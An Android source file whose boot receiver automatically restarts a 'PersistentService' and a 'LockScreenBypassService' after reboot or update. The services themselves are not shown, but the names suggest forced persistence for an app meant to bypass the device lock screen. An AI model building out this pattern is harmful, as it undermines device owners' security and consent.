package com.example.myapplication.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import com.example.myapplication.services.PersistentService;
import com.example.myapplication.services.LockScreenBypassService;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        
        Log.d(TAG, "Received broadcast: " + action);
        
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) || 
            Intent.ACTION_MY_PACKAGE_REPLACED.equals(action) ||
            Intent.ACTION_PACKAGE_REPLACED.equals(action)) {
            
            Log.d(TAG, "Device booted or app updated, starting persistent service");
            
            // Start the persistent service
            startPersistentService(context);
        }
    }
    
    private void startPersistentService(Context context) {
        try {
            // Start main persistent service
            Intent serviceIntent = new Intent(context, PersistentService.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            
            // Start lock screen bypass service
            Intent lockBypassIntent = new Intent(context, LockScreenBypassService.class);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(lockBypassIntent);
            } else {
                context.startService(lockBypassIntent);
            }
            
            Log.d(TAG, "All persistent services started successfully on boot");
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting persistent services", e);
        }
    }
}
